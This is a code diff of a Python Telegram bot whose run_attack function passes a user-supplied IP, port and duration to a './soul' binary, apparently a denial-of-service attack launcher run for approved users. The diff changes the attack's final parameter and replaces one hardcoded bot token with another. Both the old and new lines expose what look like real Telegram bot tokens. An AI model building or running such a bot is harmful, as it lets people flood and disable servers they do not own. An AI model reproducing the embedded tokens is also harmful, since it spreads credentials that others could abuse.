@@ -4,7 +4,7 @@ from telegram.ext import Application, CommandHandler, CallbackContext
 from keep_alive import keep_alive
 keep_alive()
 
-TELEGRAM_BOT_TOKEN = '7786469113:AAFjWtBSS24y3aVgEBFvcwbLNGHwcpQRg5g'
+TELEGRAM_BOT_TOKEN = '7266969567:AAGtSy4viiOyMS6Y8RARHt1U6MQZjlTfCOE'
 ADMIN_USER_ID = 1817896911
 USERS_FILE = 'users.txt'
 attack_in_progress = False
@@ -61,7 +61,7 @@ async def run_attack(chat_id, ip, port, duration, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./soul {ip} {port} {duration} 877",
+            f"./soul {ip} {port} {duration} 360",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
